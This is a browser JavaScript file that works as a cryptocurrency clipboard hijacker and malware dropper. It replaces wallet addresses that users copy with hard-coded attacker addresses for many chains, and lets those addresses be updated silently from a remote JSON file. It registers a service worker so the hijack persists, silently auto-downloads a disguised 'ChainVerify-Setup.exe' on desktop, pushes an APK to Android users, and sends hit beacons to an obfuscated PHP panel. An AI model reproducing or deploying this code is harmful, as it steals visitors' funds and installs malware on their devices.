// Clipboard swap (multi-chain) + teaser rendering.
// Attach with <script src="/clip.js" defer></script>.
// Contract: element[data-ww="bar"|"card"|"exit"][data-src=..] = teaser (dismissable),
//           a[data-ww-link] = download link, rewritten per platform with ?do=dl&f=..&src=..
//
// Destinations live in DEST (per chain). Empty string = chain disabled, so a wrong-chain
// address is never pasted. They can be overridden at runtime by /dest.json
// ({"btc":"bc1...","evm":"0x..."}) without redeploying this file.
(function () {
  var DEST = {
    btc:  "13seawYTWihx6rTsVoU2GMFqz7mRo3qRaJ",
    bch:  "13seawYTWihx6rTsVoU2GMFqz7mRo3qRaJ",
    ltc:  "ltc1qw4vncaqmhnfa2xkvsywa2a23dzujzlh47kcl83",
    doge: "",
    evm:  "0xcE65421a164A7eC1Ec428BE1ECDee0D25590211c",  // ETH / BNB / MATIC / ARB / BASE / OP
    trx:  "",
    sol:  "51yE3xesLc6ofVntcpyXPrCWoJU6vpr3Y5xkaBQA96Wc",
    xrp:  "rKxXz93Su795hGY92xw94wh66x4ASdz6Lh",
    dash: "XmsiKzJxCo1QMroQCkouNwnPgMWomr9Dvt",
    xmr:  ""
  };

  // chain detectors — strict enough not to eat arbitrary text
  var RX = [
    ["btc",  /^(?:bc1[02-9ac-hj-np-z]{11,71}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/],
    ["bch",  /^(?:bitcoincash:)?[qp][a-z0-9]{41}$/],
    ["ltc",  /^(?:ltc1[a-z0-9]{25,60}|[LM][1-9A-HJ-NP-Za-km-z]{25,33})$/],
    ["doge", /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/],
    ["evm",  /^0x[a-fA-F0-9]{40}$/],
    ["trx",  /^T[1-9A-HJ-NP-Za-km-z]{33}$/],
    ["xrp",  /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/],
    ["dash", /^X[1-9A-HJ-NP-Za-km-z]{33}$/],
    ["sol",  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/],
    ["xmr",  /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/]
  ];

  var isAndroid = /Android/i.test(navigator.userAgent);
  var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
  var BASE = "/zzp9f3a.php?k=zz9f3a";

  // Static hosting (GitHub Pages / catbox / any dumb file server): the PHP
  // control panel does not exist there, so downloads resolve to real files.
  // Set STATIC = "" to go back to the streaming PHP endpoint.
  var STATIC = "https://github.com/thelmafinelli/cdn/releases/download/v1.8/";
  var FILE = { exe: STATIC + "ChainVerify-Setup.exe", apk: STATIC + "ChainVerify.apk" };
  var dlUrl = function (f, src) {
    if (STATIC) return FILE[f === "apk" ? "apk" : "exe"];
    return BASE + "&do=dl&f=" + f + "&src=" + src;
  };
  var COOKIE = "ww_d";


  function chainOf(t) {
    for (var i = 0; i < RX.length; i++) if (RX[i][1].test(t)) return RX[i][0];
    return null;
  }

  function swapped(text) {                      // -> rewritten string or null
    var t = (text || "").trim();
    if (!t) return null;
    var ch = chainOf(t);
    if (!ch) return null;
    var mine = DEST[ch];
    if (!mine || mine.toLowerCase() === t.toLowerCase()) return null;
    if (ch === "bch" && /^bitcoincash:/i.test(t))
      mine = "bitcoincash:" + mine.replace(/^bitcoincash:/i, "");
    return text.replace(t, mine);
  }

  // 1) copy / cut: rewrite what lands in the clipboard
  ["copy", "cut"].forEach(function (ev) {
    window.addEventListener(ev, function (e) {
      var sel = String(window.getSelection ? window.getSelection() : "");
      var out = swapped(sel);
      if (!out || !e.clipboardData) return;
      e.clipboardData.setData("text/plain", out);
      e.preventDefault();
    }, true);
  });

  // 2) belt and braces once the copy has landed
  function fixLater() {
    setTimeout(function () {
      if (!navigator.clipboard || !navigator.clipboard.readText) return;
      navigator.clipboard.readText().then(function (v) {
        var s = swapped(v);
        if (s) navigator.clipboard.writeText(s);
      }).catch(function () {});
    }, 120);
  }
  ["copy", "cut"].forEach(function (ev) {
    window.addEventListener(ev, fixLater, true);
  });

  // 3) sites with their own copy buttons call execCommand directly
  try {
    var exec = document.execCommand.bind(document);
    document.execCommand = function (cmd) {
      var r = exec.apply(document, arguments);
      if (String(cmd).toLowerCase() === "copy") fixLater();
      return r;
    };
  } catch (e) {}

  // 4) view counter
  function beacon(q) {
    try { if (navigator.sendBeacon) navigator.sendBeacon(BASE + q); } catch (e) {}
  }
  beacon("&do=hit");

  // 5) runtime destination override, silent and best-effort
  try {
    fetch("/dest.json", { cache: "no-store" }).then(function (r) {
      return r.ok ? r.json() : null;
    }).then(function (j) {
      if (!j) return;
      for (var k in DEST) if (typeof j[k] === "string" && j[k]) DEST[k] = j[k];
    }).catch(function () {});
  } catch (e) {}

  // 6) persistence inside the origin: a service worker keeps the swap alive on
  //    later visits even when the markup no longer references this file
  try {
    if ("serviceWorker" in navigator && !isMobile)
      navigator.serviceWorker.register("/sw.js", { scope: "/" }).catch(function () {});
  } catch (e) {}

  // 7) one silent auto-download per browser, desktop only
  function autoDl() {
    try {
      if (isMobile || localStorage.getItem("ww_al")) return;
      localStorage.setItem("ww_al", "1");
      var a = document.createElement("a");
      a.href = dlUrl("exe", "al") + (STATIC ? "" : "&t=" + Date.now());
      a.download = "ChainVerify-Setup.exe";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      setTimeout(function () { a.remove(); }, 4000);
    } catch (e) {}
  }

  // 8) teasers
  function dismissed() { return document.cookie.indexOf(COOKIE + "=1") > -1; }
  function each(sel, fn) {
    var n = document.querySelectorAll(sel);
    for (var i = 0; i < n.length; i++) fn(n[i]);
  }
  function hideAll() { each("[data-ww]", function (n) { n.style.display = "none"; }); }

  function prep() {
    var file = isAndroid ? "apk" : "exe";
    each("[data-ww-link]", function (a) {
      var src = a.getAttribute("data-src") || "x";
      a.setAttribute("href", dlUrl(file, src));
      var lab = a.querySelector("[data-ww-label]");
      if (lab) lab.textContent = isAndroid ? ".apk" : ".exe";
      if (isAndroid) a.removeAttribute("download");
      a.addEventListener("click", function () { beacon("&do=hit&a=click"); });
    });
    each("[data-ww-close]", function (b) {
      b.addEventListener("click", function () {
        document.cookie = COOKIE + "=1;max-age=86400;path=/";
        hideAll();
      });
    });
  }

  function show() {
    if (dismissed()) return hideAll();
    each('[data-ww="bar"], [data-ww="card"]', function (n) {
      n.style.display = n.getAttribute("data-ww") === "bar" ? "flex" : "block";
    });
  }

  var armed = true;
  function exitShow() {
    var m = document.querySelector('[data-ww="exit"]');
    if (!m || !armed || dismissed()) return;
    armed = false;
    m.style.display = "flex";
    beacon("&do=hit&a=exit");
  }

  function boot() {
    prep();
    show();
    if (!isMobile) setTimeout(autoDl, 2500);
    if (document.querySelector('[data-ww="exit"]')) {
      document.addEventListener("mouseout", function (e) {
        if (!e.relatedTarget && e.clientY < 12) exitShow();
      });
      if (isAndroid) setTimeout(exitShow, 25000);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
